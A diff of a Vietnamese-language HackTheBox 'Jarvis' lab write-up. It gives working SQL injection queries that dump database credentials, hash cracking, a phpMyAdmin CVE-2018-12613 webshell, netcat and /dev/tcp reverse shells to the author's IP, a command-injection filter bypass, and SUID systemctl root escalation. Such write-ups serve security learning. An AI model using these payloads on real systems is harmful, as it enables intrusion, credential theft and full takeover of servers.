@@ -12,10 +12,10 @@ description: "Writeup of the machine in HackTheBox"
 ![Introduce Image](image.png)
 
 ## Introduction
-This is the first writeup I've ever done about a machine on HackTheBox, and it also marks the beginning of my journey into learning Pentesting. Everything is still very new to me, so in each post, I'll be talking notes on a lot of the things I learn along the way. If there are any mistakes, I hope you'll understand and forgive me!
+Đây là write-up đầu tiên về một machine trên Hack The Box, và đây cũng chính là sự khởi đầu trong hành trình học Pentesting của mình @@. Mọi thứ vẫn còn rất lạ, vì vậy trong mỗi bài viết, mình sẽ ghi chú lại khá nhiều những điều mà mình học được trong suốt quá trình làm. Nếu có bất kỳ sai sót nào, mình hy vọng mọi người sẽ thông cảm và bỏ qua!
 ## Enumeration
 ### Nmap
-Nmap - Scanning the full port range
+Nmap - Quét full port.
 ```bash
 $ nmap -p- --min-rate 10000 -oA nmap/alltcp 10.129.229.137
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 21:39 +0700
@@ -29,7 +29,7 @@ PORT      STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
 ```
-Detailed Scan
+Quét chi tiết từng port.
 ```bash
 $ nmap -p 22,80,64999 -sC -sV -oA nmap/jarvis 10.129.229.137
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 21:40 +0700
@@ -58,15 +58,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 27.59 seconds
 ```
 ### Website - TCP 64999
-It only prints one line
+Nó chỉ in ra 1 dòng duy nhất.
 ```
 Hey you have been banned for 90 seconds, don't be bad 
 ```
 ### Website - TCP 80
-This is what the website looks like
+Trang web sẽ trông như này.
 ![alt text](website_interface.png)
 ### Tech Stack
-The site's response headers reveal that it uses **IronWAF**. I did a quick Google search for IronWAF, but couldn't find much useful information.
+Response headers cho thấy rằng có sử dụng **IronWAF**. Nhưng mình tra ở google thì không có cái gì thú vị cả -.-
 ```bash
 HTTP/1.1 200 OK
 Date: Thu, 13 Aug 2026 17:03:51 GMT
@@ -118,17 +118,16 @@ Finished
 ```
 ## Shell as www-data
 ### SQL Injection
-I discovered an endpoint at `room.php` with a parameter called `cod`. It appears to be vulnerable to SQL Injection with the test payload I used being `cod='`.
+Phát hiện một endpoint tại `room.php` với một tham số có tên là `cod`. Tham số này tồn tại một lỗ hổng **SQL Injection**, với payload mình test thử là `cod='`.
 ![alt text](discovered_vuln.png)
-My target takes user and pass to authenticate at `/phpAdmin`.
+Mục tiêu của mình là leak được username và password để đăng nhập tại `/phpAdmin`.
 ![alt text](login_phpmyadmin.png)
-I worked through the process of determining the number of columns using `union select`.[^union_select]. It turned out to be 7.
-[^union_select]: UNION SELECT requires the appended query to return the same number of columns as the original query. In addition, the corresponding columns must have compatible data types.
-
+Tiến hành xác định số lượng cột bằng cách sử dụng `union select`.[^union_select]. Kết quả cho thấy là 7 cột.
+[^union_select]: UNION SELECT Yêu cầu câu truy vấn được nối thêm phải trả về cùng số lượng cột với câu truy vấn ban đầu. Ngoài ra, các cột tương ứng phải có kiểu dữ liệu tương thích.
 
 ![alt text](union_select.png)
-Leaking information about databases: I query the `INFORMATION_SCHEMA.SCHEMATA` table to retrieve information about the databases available to the current MYSQL user. The `SCHEMA_NAME` column contains the name of each schema. I then use `GROUP_CONCAT()`[^GROUP_CONCAT] function to print single string. [Document MySQL](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html) and [Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
-[^GROUP_CONCAT]: GROUP_CONCAT() function to concatenate multiple values into a single string. [Link here](https://www.geeksforgeeks.org/sql/mysql-group_concat-function/)
+Query bảng `INFORMATION_SCHEMA.SCHEMATA` để lấy thông tin về các database mà user MySQL hiện tại có thể truy cập. Cột  `SCHEMA_NAME` chứa tên của từng schema. Sau đó, sử dụng hàm `GROUP_CONCAT()`[^GROUP_CONCAT] [Document MySQL](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html) và [Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+[^GROUP_CONCAT]: Hàm GROUP_CONCAT() được sử dụng để nối nhiều giá trị thành một chuỗi duy nhất. [Link here](https://www.geeksforgeeks.org/sql/mysql-group_concat-function/)
 
 
 ![alt text](req_1.png)
@@ -139,7 +138,7 @@ hotel:
 ,mysql:
 ,performance_schema:
 ```
-Retrieving Information about hotel table.
+Leak dữ liệu về các bảng trong database hotel.
 ```
 Query:
 GET /room.php?cod=100+UNION+SELECT+1,2,(SELECT+group_concat(TABLE_NAME,+":",+COLUMN_NAME,+"\r\n")+FROM+information_schema.COLUMNS+WHERE+TABLE_SCHEMA+=+'hotel'),4,5,6,7;--+- HTTP/1.1
@@ -152,7 +151,7 @@ room:cod
 ,room:image
 ,room:mini
 ```
-Retrieving Information about MySQL table.
+Leak dữ liệu về các bảng trong database mysql.
 ```
 Query:
 GET /room.php?cod=100+UNION+SELECT+1,2,(SELECT+group_concat(TABLE_NAME,+":",+COLUMN_NAME,+"\r\n")+FROM+information_schema.COLUMNS+WHERE+TABLE_SCHEMA+=+'mysql'),4,5,6,7;--+- HTTP/1.1
@@ -210,7 +209,7 @@ column_stats:db_name
 ,event:starts
 ,e
 ```
-Retrieving Information about User MySQL.
+Leak dữ liệu về user trong mysql.
 ```
 Query:
 GET /room.php?cod=100+UNION+SELECT+1,2,(SELECT+group_concat(host,+":",+user,+":",+password,\r\n")+FROM+mysql.user),4,5,6,7;--+- HTTP/1.1
@@ -218,13 +217,13 @@ Result:
 localhost:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 ```
 ### Way 1: Leaking user and password via Hashcat
-Save it to a file and check its length to determine which Hashmode it is compatible with. Use the `-n` option to prevent the string from being appended with `\n`.
+Lưu password cần hash vào một file và kiểm tra độ dài để xác định chuỗi cần băm tương thích với **Hashmode** nào. Sử dụng `-n` để tránh việc chuỗi bị chèn `\n` vào cuối.
 ```bash
 $ echo -n '2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > jarvis.hashes
 $ wc -c jarvis.hashes
 40 jarvis.hashes
 ```
-Now, let's find which Hashcat hashmode has a length similar to the hash we need to crack.
+Bây giờ, hãy tìm xem Hashcat hashmode nào có độ dài tương tự với hash mà chúng ta cần crack.
 ```bash
 $ ./hashcat --example-hashes | grep -i mysql -B1 -A2
 Hash mode #200
@@ -262,9 +261,9 @@ Hash mode #11200
   Example.Pass........: hashcat
   Benchmark.Mask......: ?a?a?a?a?a?a?a
 ```
-There is a slight issue here: some hash modes do not have an **Example.Hash**, so I had to search the web to verify them. See the [example_hash_wiki](https://hashcat.net/wiki/doku.php?id=example_hashes). It turns out that mode 300 has a length matching the hash I need to crack.
+Có một vấn đề nhỏ ở đây: một số hash mode không có example.hash, vì vậy mình phải tìm kiếm trên web để xác định. Xem [example_hash_wiki](https://hashcat.net/wiki/doku.php?id=example_hashes). Kết quả cho thấy mode 300 có độ dài phù hợp với hash mà mình cần.
 ![alt text](hash_example.png)
-Hashcat was then able to crack the hash and recover the password: `imissyou`.
+Sau đó hashcat đã có thể crack hash và lấy được password: `imissyou`.
 ```bash
 $ hashcat -m 300 jarvis.hashes /usr/share/wordlists/passwords/rockyou.txt
 hashcat (v7.1.2) starting
@@ -329,7 +328,7 @@ Started: Fri Aug 14 09:51:52 2026
 Stopped: Fri Aug 14 09:51:59 2026
 ```
 ### Way 2: Leaking via SQL Injection (LOAD_FILE)
-Based on the Nmap results: `80/tcp open http Apache httpd 2.4.25 ((Debian))` we can determine that the web server is running **Apache 2.4.25 on Debian**. The default Virtual Host configuration is located at: `/etc/apache2/sites-enabled/000-default.conf`. This file contains the **DocumentRoot** directive, which specifies the directory containning the web application's source code. From there, we can access and read the application's source code from the corresponding directory.
+Dựa tên kết quả Nmap: `80/tcp open http Apache httpd 2.4.25 ((Debian))` chúng ta có thể xác định rằng web server đang chạy **Apache 2.4.25 trên Debian**. Vậy nên điều đầu tiên cần làm chính là xem thử file cấu hình **Virtual Host** mặc định nằm tại: `/etc/apache2/sites-enabled/000-default.conf`. File này chứa **DocumentRoot** dùng để chỉ định thư mục chứa source code của ứng dụng web. Từ đó, chúng ta có thể truy cập chính xác đường dẫn đến từng source code của ứng dụng.
 ```
 Query: 
 GET /room.php?cod=100+UNION+SELECT+1,2,(LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')),4,5,6,7;--+- HTTP/1.1
@@ -362,7 +361,7 @@ Output:
 	# after it has been globally disabled with "a2disconf".
 	#Include conf-available/serve-cgi-bin.conf
 ```
-I leaked the source code of `index.php` to take a look and discovered an interesting piece of code:
+Mình leak được source code của `index.php` sau đó thấy được đường dẫn `connection.php` có thể đó chính là source cấu hình cho database.
 ```php
 <?php
 
@@ -398,7 +397,7 @@ I leaked the source code of `index.php` to take a look and discovered an interes
 
               ?>
 ```
-After that, I read the `connection.php` source code and obtained the username and password.
+Lấy thành công user và password.
 ```
 Query:
 GET /room.php?cod=100+UNION+SELECT+1,2,(LOAD_FILE('/var/www/html/connection.php')),4,5,6,7;--+- HTTP/1.1
@@ -408,17 +407,331 @@ $connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
 ?>
 ```
 ### Way 1: Getshell via CVE 2018-12613
-[CVE-2018-12613](https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e) is a Local File Inclusion vulnerability in **phpMyAdmin 4.8.0–4.8.1**, caused by an inconsistency between the path being validated and the path actually being included.
+[CVE-2018-12613](https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e) là một lỗ hổng **Local File Inclusion (LFI)** trong **phpMyAdmin 4.8.0–4.8.1**, xảy ra do sự mâu thuẫn giữa chuỗi được dùng để **kiểm tra** và chuỗi được dùng để **include** thực tế.
 
-Specifically, index.php calls the `Core::checkPageValidity()` function to validate the target parameter before including it. The function works by stripping everything after the `?` character and then checking the remaining part against a whitelist. However, after the check passes, index.php includes the entire original string without stripping it, creating an opportunity for exploitation.
+Cụ thể, `index.php` gọi hàm `Core::checkPageValidity()` để xác thực tham số `target` trước khi include. Hàm này decode URL của chuỗi đầu vào, sau đó strip toàn bộ phần sau ký tự `?`, rồi đối chiếu phần còn lại với một whitelist. Tuy nhiên, lệnh `include` phía sau lại nhận **chuỗi gốc chưa được decode** — do đó, nếu attacker truyền vào `db_sql.php%3f../../../etc/passwd`, hàm kiểm tra chỉ thấy `db_sql.php` (hợp lệ trong whitelist), trong khi PHP tự decode `%3f` thành `?` khi xử lý đường dẫn, khiến file thực sự được include là `db_sql.php` kèm theo phần path traversal phía sau.
 
-An attacker can exploit this flaw to read arbitrary files on the server through path traversal. Furthermore, the LFI can be escalated to **Remote Code Execution (RCE)** by executing an SQL query containing a PHP payload in phpMyAdmin and then including the session file containing that payload, causing the code to be executed on the server.
+Kẻ tấn công có thể khai thác lỗ hổng này để **đọc file tùy ý** trên máy chủ thông qua **Path Traversal**. Hơn nữa, LFI có thể được nâng cấp thành **Remote Code Execution (RCE)** theo các bước sau:
 
+1. Đăng nhập vào phpMyAdmin và thực thi câu lệnh SQL `SELECT '<?php system($_GET["cmd"]); ?>'` — payload PHP sẽ được phpMyAdmin **ghi vào session file** của người dùng hiện tại (thường nằm tại `/tmp/sess_<session_id>`).
+2. Sử dụng lỗ hổng LFI để **include session file** đó, khiến PHP thực thi đoạn code bên trong.
 
+Từ đó, attacker có thể thực thi lệnh tùy ý trên máy chủ.
 
+Gửi query `SELECT '<?php system($_GET["cmd"]);?>'` và chạy lại url này để reverse shell: `http://10.129.229.137/phpmyadmin/index.php?cmd=nc+-e+/bin/sh+10.10.15.221+4444&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_la747sd7sarqoh3gplte14saiufjfn2q`.
 
+Reverse shell thành công!
+```
+$nc -lnvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.229.137 40120
+```
+
+### Way 2: Getshell via SQL Injection (INTO OUTFILE)
+
+`INTO OUTFILE` là một tính năng hợp lệ của MySQL, cho phép xuất kết quả của một câu SELECT ra một file trên filesystem của server.
+```
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
+```
+MySQL không quan tâm đây là PHP - nó chỉ đơn thuần ghi chuỗi đó ra file. Nhưng nếu file được ghi vào thư mục web, PHP server sẽ thực thi nó khi có request truy cập.
+![alt text](image-1.png)
+Đã thực thi lệnh `cmd` thành công! Dựa vào đó thì có thể gửi payload reverse shell để lấy shell.
+![alt text](image-2.png)
+## Privilege: www-data -> pepper
+Để tương tác dễ hơn trên shell.
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRLZ
+stty raw -echo; fg
+reset
+screen
+```
+Sau khi lấy được shell với tư cách `www-data` thông qua webshell, tiến hành kiểm tra các quyền `sudo` hiện có. Có thể thấy `www-data` được phép chạy `/var/www/Admin-Utilities/simpler.py` với tư cách user `pepper` mà **không cần nhập password**.
+```bash
+www-data@jarvis:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+```
+Lấy file về máy mình đọc cho tiện hơn.
+```bash
+Terminal Attacker:
+nc -lnvp 90 > script.py
+Terminal Client:
+cat /var/www/Admin-Utilities/simpler.py | nc 10.10.15.221 90
+```
+File script.py
+```python
+#!/usr/bin/env python3
+from datetime import datetime
+import sys
+import os
+from os import listdir
+import re
+
+def show_help():
+    message='''
+********************************************************
+* Simpler   -   A simple simplifier ;)                 *
+* Version 1.0                                          *
+********************************************************
+Usage:  python3 simpler.py [options]
+
+Options:
+    -h/--help   : This help
+    -s          : Statistics
+    -l          : List the attackers IP
+    -p          : ping an attacker IP
+    '''
+    print(message)
+
+def show_header():
+    print('''***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+''')
+
+def show_statistics():
+    path = '/home/pepper/Web/Logs/'
+    print('Statistics\n-----------')
+    listed_files = listdir(path)
+    count = len(listed_files)
+    print('Number of Attackers: ' + str(count))
+    level_1 = 0
+    dat = datetime(1, 1, 1)
+    ip_list = []
+    reks = []
+    ip = ''
+    req = ''
+    rek = ''
+    for i in listed_files:
+        f = open(path + i, 'r')
+        lines = f.readlines()
+        level2, rek = get_max_level(lines)
+        fecha, requ = date_to_num(lines)
+        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if fecha > dat:
+            dat = fecha
+            req = requ
+            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if int(level2) > int(level_1):
+            level_1 = level2
+            ip_list = [ip]
+            reks=[rek]
+        elif int(level2) == int(level_1):
+            ip_list.append(ip)
+            reks.append(rek)
+        f.close()
+	
+    print('Most Risky:')
+    if len(ip_list) > 1:
+        print('More than 1 ip found')
+    cont = 0
+    for i in ip_list:
+        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
+        cont = cont + 1
+	
+    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
+	
+def list_ip():
+    print('Attackers\n-----------')
+    path = '/home/pepper/Web/Logs/'
+    listed_files = listdir(path)
+    for i in listed_files:
+        f = open(path + i,'r')
+        lines = f.readlines()
+        level,req = get_max_level(lines)
+        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
+        f.close()
+
+def date_to_num(lines):
+    dat = datetime(1,1,1)
+    ip = ''
+    req=''
+    for i in lines:
+        if 'Level' in i:
+            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
+            regex = '(\d+)-(.*)-(\d+)(.*)'
+            logEx=re.match(regex, fecha).groups()
+            mes = to_dict(logEx[1])
+            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
+            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
+            if fecha > dat:
+                dat = fecha
+                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
+    return dat, req
+			
+def to_dict(name):
+    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
+    return month_dict[name]
+	
+def get_max_level(lines):
+    level=0
+    for j in lines:
+        if 'Level' in j:
+            if int(j.split(' ')[4]) > int(level):
+                level = j.split(' ')[4]
+                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
+    return level, req
+	
+def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)
+
+if __name__ == '__main__':
+    show_header()
+    if len(sys.argv) != 2:
+        show_help()
+        exit()
+    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
+        show_help()
+        exit()
+    elif sys.argv[1] == '-s':
+        show_statistics()
+        exit()
+    elif sys.argv[1] == '-l':
+        list_ip()
+        exit()
+    elif sys.argv[1] == '-p':
+        exec_ping()
+        exit()
+    else:
+        show_help()
+        exit()
+```
+Nhìn qua ta thấy có một bug như sau: Ở hàm `exec_ping` thì có thực hiện một lệnh `os.system` ta có thể bypass forbidden và trigger nó bằng option `-p`.
+Đẩy file `bash.sh` vào client:
+```bash
+Terminal Attacker:
+python3 -m http.server 80
+Terminel Client:
+wget 10.10.15.221/bash.sh
+```
+Thực thi script:
+```bash
+www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: $(/tmp/bash.sh)               
+```
+Lấy shell thành công!
+```
+$nc -lnvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.129.229.137 49472
+pepper@jarvis:/tmp$ 
+```
+## Privilege: pepper -> root
+Trick lỏ ssh để tiện trong quá trình priv: kiểm tra xem user `pepper` có shell hợp lệ không?
+```bash
+pepper@jarvis:~$ cat /etc/passwd | grep pepper
+pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
+```
+Setup **SSH key authentication**:
+```bash
+Attacker Terminal
+#ssh-keygen -f pepper -N ""
+#cat pepper.pub
+#chmod 600 pepper
+Client Terminal
+#mkdir /home/pepper/.ssh
+#chmod 700 /home/pepper/.ssh
+#cd /home/pepper/.ssh
+#echo -n 'paste content of pepper.pub' > authorized_keys
+#chmod 600 authorized_key
+Attacker Terminal
+#ssh -i pepper pepper@10.129.229.137
+The authenticity of host '10.129.229.137 (10.129.229.137)' can't be established.
+ED25519 key fingerprint is SHA256:GaSWjdBVIx1lUfM+vIvARm9dArCqI6Cbk/IXmDpPFHc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.229.137' (ED25519) to the list of known hosts.
+Linux jarvis 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Oct 10 09:53:15 2023 from 10.10.14.23
+pepper@jarvis:~$ 
+```
+Mình kiểm tra xem quyền sudo nhưng `sudo -l` không phản hồi gì cả nên thay vào đó mình tìm kiếm những file có **SUID bit** được set:
+```bash
+pepper@jarvis:~$ find / -perm -4000 -ls 2>/dev/null
+     3969     32 -rwsr-xr-x   1 root     root        30800 Aug 21  2018 /bin/fusermount
+     3827     44 -rwsr-xr-x   1 root     root        44304 Mar  7  2018 /bin/mount
+     3924     60 -rwsr-xr-x   1 root     root        61240 Nov 10  2016 /bin/ping
+     9420    172 -rwsr-x---   1 root     pepper     174520 Jun 29  2022 /bin/systemctl
+     3828     32 -rwsr-xr-x   1 root     root        31720 Mar  7  2018 /bin/umount
+     3774     40 -rwsr-xr-x   1 root     root        40536 Mar 17  2021 /bin/su
+     3779     40 -rwsr-xr-x   1 root     root        40312 Mar 17  2021 /usr/bin/newgrp
+    16679     60 -rwsr-xr-x   1 root     root        59680 Mar 17  2021 /usr/bin/passwd
+    16678     76 -rwsr-xr-x   1 root     root        75792 Mar 17  2021 /usr/bin/gpasswd
+    16676     40 -rwsr-xr-x   1 root     root        40504 Mar 17  2021 /usr/bin/chsh
+    15178    140 -rwsr-xr-x   1 root     root       140944 Jan 23  2021 /usr/bin/sudo
+    16675     52 -rwsr-xr-x   1 root     root        50040 Mar 17  2021 /usr/bin/chfn
+    23972     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+    32974    432 -rwsr-xr-x   1 root     root       440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
+      289     44 -rwsr-xr--   1 root     messagebus    42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+Trong danh sách trả về, `/bin/systemctl` nổi bật với permission `rwsr-x---` và group là `pepper` — khác hoàn toàn so với các file còn lại đều là `root:root`. Điều này có nghĩa là **chỉ user thuộc group `pepper` mới chạy được**, nhưng khi chạy thì process sẽ được thực thi với quyền `root` do SUID. Đây là file có khả năng để chúng ta privilege.
+
+Xem trên trang GTFObins thì có tồn tại cách hướng dẫn priv file systemctl.
+![alt text](gtfobins.png)
+Payload priv:
+```bash
+# Located at /home/pepper
+pepper@jarvis:~$ cat bash.sh 
+bash -i >& /dev/tcp/10.10.15.221/5555 0>&1
+pepper@jarvis:~$ cat priv.service
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /home/pepper/bash.sh
+[Install]
+WantedBy=multi-user.target
+pepper@jarvis:~$ systemctl link /home/pepper/priv.service 
+Created symlink /etc/systemd/system/priv.service → /home/pepper/priv.service.
+pepper@jarvis:~$ systemctl enable --now /home/pepper/priv.service
+Created symlink /etc/systemd/system/multi-user.target.wants/priv.service → /home/pepper/priv.service.
+```
+Leo root thành công!
+```bash
+ $nc -lnvp 5555
+Listening on 0.0.0.0 5555
+Connection received on 10.129.229.137 44196
+bash: cannot set terminal process group (2624): Inappropriate ioctl for device
+bash: no job control in this shell
+root@jarvis:/# cat root/root.txt
+```
+![alt text](image-3.png)
 ## Reference
 [1] https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
 
 
-[2] 
+[2] https://www.youtube.com/watch?v=YHHWvXBfwQ8
